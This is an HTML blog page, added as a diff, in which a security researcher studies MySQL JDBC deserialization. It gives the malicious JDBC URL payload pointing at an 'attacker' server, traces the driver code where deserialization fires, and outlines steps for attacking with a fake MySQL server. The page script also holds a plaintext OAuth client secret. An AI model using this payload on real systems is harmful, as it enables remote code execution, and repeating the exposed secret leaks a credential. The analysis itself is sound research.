@@ -1,0 +1,306 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="google-site-verification" content="xBT4GhYoi5qRD5tr338pgPM5OWHHIDR6mNg1a3euekI" />
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="description" content="">
+    <meta name="keyword"  content="">
+    <link rel="shortcut icon" href="/img/favicon.ico">
+
+    <title>
+        
+        MySQL-JDBC 反序列化学习 - Daybr4ak&#39;s Blog
+        
+    </title>
+
+    <!-- Custom CSS -->
+    <link rel="stylesheet" href="/css/aircloud.css">
+    <link rel="stylesheet" href="/css/gitment.css">
+    <!--<link rel="stylesheet" href="https://imsun.github.io/gitment/style/default.css">-->
+    <link href="//at.alicdn.com/t/font_620856_pl6z7sid89qkt9.css" rel="stylesheet" type="text/css">
+    <!-- ga & ba script hoook -->
+    <script></script>
+</head>
+
+<body>
+
+<div class="site-nav-toggle" id="site-nav-toggle">
+    <button>
+        <span class="btn-bar"></span>
+        <span class="btn-bar"></span>
+        <span class="btn-bar"></span>
+    </button>
+</div>
+
+<div class="index-about">
+    <i> sometimes code, sometimes hack. </i>
+</div>
+
+<div class="index-container">
+    
+    <div class="index-left">
+        
+<div class="nav" id="nav">
+    <div class="avatar-name">
+        <div class="avatar">
+            <img src="/img/Daybreak.png" />
+        </div>
+        <div class="name">
+            <i>Daybr4ak</i>
+        </div>
+    </div>
+    <div class="contents" id="nav-content">
+        <ul>
+            <li >
+                <a href="/">
+                    <i class="iconfont icon-shouye1"></i>
+                    <span>主页</span>
+                </a>
+            </li>
+            <li >
+                <a href="/tags">
+                    <i class="iconfont icon-biaoqian1"></i>
+                    <span>标签</span>
+                </a>
+            </li>
+            <li >
+                <a href="/archives">
+                    <i class="iconfont icon-guidang2"></i>
+                    <span>存档</span>
+                </a>
+            </li>
+            <li >
+                <a href="/about/">
+                    <i class="iconfont icon-guanyu2"></i>
+                    <span>关于</span>
+                </a>
+            </li>
+            
+            <li>
+                <a id="search">
+                    <i class="iconfont icon-sousuo1"></i>
+                    <span>搜索</span>
+                </a>
+            </li>
+            
+        </ul>
+    </div>
+    
+        <div id="toc" class="toc-article">
+    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#前言"><span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#JDBC"><span class="toc-text">JDBC</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#MySQL-JDBC-反序列化"><span class="toc-text">MySQL JDBC 反序列化</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#反序列化分析"><span class="toc-text">反序列化分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#参考文章"><span class="toc-text">参考文章</span></a></li></ol>
+</div>
+    
+</div>
+
+
+<div class="search-field" id="search-field">
+    <div class="search-container">
+        <div class="search-input">
+            <span id="esc-search"> <i class="icon-fanhui iconfont"></i></span>
+            <input id="search-input"/>
+            <span id="begin-search">搜索</span>
+        </div>
+        <div class="search-result-container" id="search-result-container">
+
+        </div>
+    </div>
+</div>
+        <div class="index-about-mobile">
+            <i> sometimes code, sometimes hack. </i>
+        </div>
+    </div>
+    
+    <div class="index-middle">
+        <!-- Main Content -->
+        
+
+
+<div class="post-container">
+    <div class="post-title">
+        MySQL-JDBC 反序列化学习
+    </div>
+
+    <div class="post-meta">
+        <span class="attr">发布于：<span>2020-07-23 15:03:35</span></span>
+        
+        <span class="attr">标签：/
+        
+        <a class="tag" href="/tags/#JAVA" title="JAVA">JAVA</a>
+        <span>/</span>
+        
+        
+        </span>
+        <span class="attr">访问：<span id="busuanzi_value_page_pv"></span>
+</span>
+</span>
+    </div>
+    <div class="post-content ">
+        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>最近学习java的时候看到了<a href="https://i.blackhat.com/eu-19/Thursday/eu-19-Zhang-New-Exploit-Technique-In-Java-Deserialization-Attack.pdf" target="_blank" rel="noopener">这样一篇文章</a>，内容是mysql-jdbc的反序列化利用。该漏洞只需要能够控制客户端的jdbc链接，在链接阶段就可以进行处发反序列化，于是开始了进一步研究。</p>
+<h2 id="JDBC"><a href="#JDBC" class="headerlink" title="JDBC"></a>JDBC</h2><p>JDBC（Java Data Base Connectivity,java数据库连接）是一种用于执行SQL语句的Java API，可以为多种关系数据库提供统一访问，它由一组用Java语言编写的类和接口组成。是Java访问数据库的标准规范。简单理解为链接数据库、对数据库操作都需要通过jdbc来实现。也就是说我们通常会使用JDBC接口会做三件事：</p>
+<p>1、链接数据库<br>2、执行数据库语句<br>3、JDBC返回数据库的执行结果</p>
+<p>JDBC对mysql连接形式为：<br><figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">jdbc:</span><span class="string">mysql:</span><span class="comment">//127.0.0.1:3306/mysql?user=root&amp;pass=root</span></span><br></pre></td></tr></table></figure></p>
+<p>在？后可跟多个可选的参数</p>
+<h2 id="MySQL-JDBC-反序列化"><a href="#MySQL-JDBC-反序列化" class="headerlink" title="MySQL JDBC 反序列化"></a>MySQL JDBC 反序列化</h2><p>在该blackhat的议题中提到了使用ServerStatusDiffInterceptor的方式去触发。提供了两个参数：</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">autoDeserialize     <span class="regexp">//</span> 驱动程序是否应该自动检测和反序列化存储在BLOB字段中的对象</span><br><span class="line"></span><br><span class="line">queryInterceptors   <span class="regexp">//</span> 逗号分隔的类列表，这些类实<span class="string">"com.mysql.cj.interceptors.QueryInterceptor"</span>的接口，应将其放置在查询执行之间来影响结果。</span><br></pre></td></tr></table></figure>
+<p>随后提供了利用链路及方法:</p>
+<p><img src="/img/media/MySQL-JDBC/2020-07-22-11-12-09.png" alt=""></p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">jdbc:mysql:<span class="comment">//attacker/db?</span></span><br><span class="line">queryInterceptors=com<span class="selector-class">.mysql</span><span class="selector-class">.cj</span><span class="selector-class">.jdbc</span><span class="selector-class">.interceptors</span><span class="selector-class">.ServerStatusDiffInterceptor</span></span><br><span class="line">&amp;autoDeserialize=true</span><br></pre></td></tr></table></figure>
+<p>当攻击者部署了恶意的mysql服务器，并且在可控的JDBC链接处将该payload发送过去，就会将payload执行的结果返回回来。接下来需要看该攻击是如何实现的。这里在本地使用payload的时候发现触发了4次接下来将分析如何触发该利用链，以及为何触发了4次。</p>
+<h2 id="反序列化分析"><a href="#反序列化分析" class="headerlink" title="反序列化分析"></a>反序列化分析</h2><p>这里为了更深入的了解我跟了下jdbc连接数据库的流程：</p>
+<p>在数据库连接时会调用getConnection()方法去建立了连接，在com.mysql.cj.conf.ConnectionUrlParser将所有的参数进行分割。</p>
+<p><img src="/img/media/MySQL-JDBC/2020-07-22-14-29-03.png" alt=""></p>
+<figure class="highlight dos"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">scheme 数据库的连接类型</span><br><span class="line">authority 数据库的连接地址及端口</span><br><span class="line"><span class="built_in">path</span> 连接的数据库名称</span><br><span class="line">query 带入执行的参数</span><br></pre></td></tr></table></figure>
+<p>随后又将query的内容进行分割，传入com.mysql.cj.jdbc.ConnectionImpl对propertySet进行设置。</p>
+<p><img src="/img/media/MySQL-JDBC/2020-07-22-14-37-42.png" alt=""></p>
+<p><img src="/img/media/MySQL-JDBC/2020-07-22-14-57-59.png" alt=""></p>
+<p>之后会与mysql进行初始连接，在NativeSession.class里会获取当前mysql的环境然后会触发一次查询”SET NAMES utf”</p>
+<p>随后会调用com.mysql.cj.protocol.a.NativeProtocol类中的sendQueryString，而在上述的利用链中我们可以得知在com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor中的preProcess及postProcess都会触发populateMapWithSessionStatusValues这个方法，而这个方法才是调用readObject方法的前置处罚点。这里可以看到sendQueryString方法中有两个地方分别调用了preProces和postProcess方法</p>
+<figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">this</span>.queryInterceptors != <span class="literal">null</span>) &#123;</span><br><span class="line">                T interceptedResults = invokeQueryInterceptorsPre(query, callingQuery, <span class="literal">false</span>);</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (interceptedResults != <span class="literal">null</span>) &#123;</span><br><span class="line">                    <span class="keyword">return</span> interceptedResults;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            ....</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">this</span>.queryInterceptors != <span class="literal">null</span>) &#123;</span><br><span class="line">                T interceptedResults = invokeQueryInterceptorsPost(query, callingQuery, rs, <span class="literal">false</span>);</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (interceptedResults != <span class="literal">null</span>) &#123;</span><br><span class="line">                    rs = interceptedResults;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure>
+<p>在第一次触发查询后会进入该方法调用invokeQueryInterceptorsPre()从而触发preProcess()方法</p>
+<p><img src="/img/media/MySQL-JDBC/2020-07-22-15-25-24.png" alt=""></p>
+<p><img src="/img/media/MySQL-JDBC/2020-07-22-15-51-28.png" alt=""></p>
+<p>随后执行了”SHOW SESSION STATUS” resultSetToMap中触发了getObject(),反序列化的数据就是执行”SHOW SESSION STATUS”查询的返回集。</p>
+<p><img src="/img/media/MySQL-JDBC/2020-07-22-15-55-09.png" alt=""></p>
+<p>跟入com.mysql.cj.jdbc.result.ResultSetImpl#getObject 可以看到反序列化的触发点，当传入的数据为BLOB类型的时候会进行反序列化</p>
+<p><img src="/img/media/MySQL-JDBC/2020-07-22-15-57-32.png" alt=""></p>
+<p>这里第一次触发了反序列化，接下来会触发SET autocommit=1查询。</p>
+<p>然后又会进入NativeProtocol#sendQueryString,这里会触发一次postProcess</p>
+<p><img src="/img/media/MySQL-JDBC/2020-07-22-15-27-42.png" alt=""></p>
+<p>随后服务器因为执行了SHOW SESSION STATUS 会触发一次preProcess()</p>
+<p>进而在触发SET sql_mode=’STRICT_TRANS_TABLES’查询</p>
+<p>然后进入NativeProtocol#sendQueryString触发一次postProcess</p>
+<p>至此整个流程结束。整个利用方法就明白了：</p>
+<p>1、在环境中有可利用的gadget。<br>2、本地搭建恶意的mysql服务器，想办法修改SHOW SESSION STATUS返回集中的某个value，改为我们使用gadget生成的payload。<br>3、在可控的jdbc连接处发送连接恶意服务器的请求。<br>4、反序列化触发。</p>
+<p>这里SHOW SESSION STATUS读取的是系统表INFORMATION_SCHEMA.SESSION_STATUS的值，但是系统表是不允许修改的，所以需要想办法操纵返回的数据。可以<a href="https://github.com/codeplutos/MySQL-JDBC-Deserialization-Payload" target="_blank" rel="noopener">参考</a>也可以直接使用fnmsd师傅开发的<a href="https://github.com/fnmsd/MySQL_Fake_Server" target="_blank" rel="noopener">工具</a>。</p>
+<p>这里在学习的过程中发现师傅们还发现了另外一条链路在mysql cj的库为5.x的时候使用detectCustomCollations触发，由于该链路触发的方式和8.x触发的方式不一样，是使用的SHOW COLLATION只触发了一次反序列化，有兴趣的师傅们可以去看一下，这里大家可以参考<br><a href="https://www.anquanke.com/post/id/203086" target="_blank" rel="noopener">https://www.anquanke.com/post/id/203086</a> fnmsd师傅给出了不同版本的mysql cj的利用方式。</p>
+<h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="https://i.blackhat.com/eu-19/Thursday/eu-19-Zhang-New-Exploit-Technique-In-Java-Deserialization-Attack.pdf" target="_blank" rel="noopener">https://i.blackhat.com/eu-19/Thursday/eu-19-Zhang-New-Exploit-Technique-In-Java-Deserialization-Attack.pdf</a><br><a href="https://www.anquanke.com/post/id/203086" target="_blank" rel="noopener">https://www.anquanke.com/post/id/203086</a></p>
+
+        
+            <div class="donate-container">
+    <div class="donate-button">
+        <button id="donate-button">赞赏</button>
+    </div>
+    <div class="donate-img-container hide" id="donate-img-container">
+        <img id="donate-img" src="" data-src="/img/pay.jpg">
+        <p> 感谢鼓励 </p>
+    </div>
+</div>
+        
+        <br />
+        <div id="comment-container">
+        </div>
+        <div id="disqus_thread"></div>
+
+        <div id="lv-container">
+        </div>
+
+    </div>
+</div>
+
+    </div>
+</div>
+
+
+<footer class="footer">
+    <ul class="list-inline text-center">
+        
+        
+
+        
+
+        
+
+        
+        <li>
+            <a target="_blank"  href="https://github.com/daybr4ak">
+                            <span class="fa-stack fa-lg">
+                                <i class="iconfont icon-github"></i>
+                            </span>
+            </a>
+        </li>
+        
+
+        
+
+    </ul>
+    
+    <p>
+        <span>/</span>
+        
+        <span><a href="http://pupiles.com">pupil</a></span>
+        <span>/</span>
+        
+        <span><a href="https://www.cnblogs.com/test404/">胖虎</a></span>
+        <span>/</span>
+        
+        <span><a href="https://gloxec.github.io/">hook</a></span>
+        <span>/</span>
+        
+        <span><a href="https://drops.org.cn/">Ra1ndr0op</a></span>
+        <span>/</span>
+        
+    </p>
+    
+    <p>
+        <span id="busuanzi_container_site_pv">
+	    总访问量
+            <span id="busuanzi_value_site_pv"></span>次
+        </span>
+        <span id="busuanzi_container_site_uv">
+	    总访客
+            <span id="busuanzi_value_site_uv"></span>人
+        </span>
+        Created By <a href="https://hexo.io/">Hexo</a>  Theme <a href="https://github.com/aircloud/hexo-theme-aircloud">AirCloud</a></p>
+</footer>
+
+
+
+
+</body>
+
+<script>
+    // We expose some of the variables needed by the front end
+    window.hexo_search_path = "search.json"
+    window.hexo_root = "/"
+    window.isPost = true
+</script>
+<script src="https://cdn.bootcss.com/jquery/3.3.1/jquery.min.js"></script>
+<script src="/js/index.js"></script>
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+<link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
+<script src="https://unpkg.com/gitalk@latest/dist/gitalk.min.js"></script>
+
+<script src="/js/gitment.js"></script>
+<script type="text/javascript">
+    var gitalk = new Gitalk({
+
+    // gitalk的主要参数
+        clientID: 'b2b890dbf29d011e8a47',
+        clientSecret: '45618d62e41c62c53ade7486ace5265af874fc5f',
+        repo: 'daybr4ak.github.io',
+        owner: 'daybr4ak',
+        admin: ['Daybr4ak'],
+        id: 'MySQL-JDBC 反序列化学习',
+    
+    });
+    gitalk.render('comment-container');
+</script>
+<!-- <script>
+    var gitalk = new Gitalk({
+        id: 'MySQL-JDBC 反序列化学习',
+        owner: 'daybr4ak',
+        repo: 'daybr4ak.github.io',
+        oauth: {
+            client_id: 'b2b890dbf29d011e8a47',
+            client_secret: '45618d62e41c62c53ade7486ace5265af874fc5f',
+        },
+    })
+    gitment.render('comment-container')
+</script> -->
+
+
+
+
+</html>
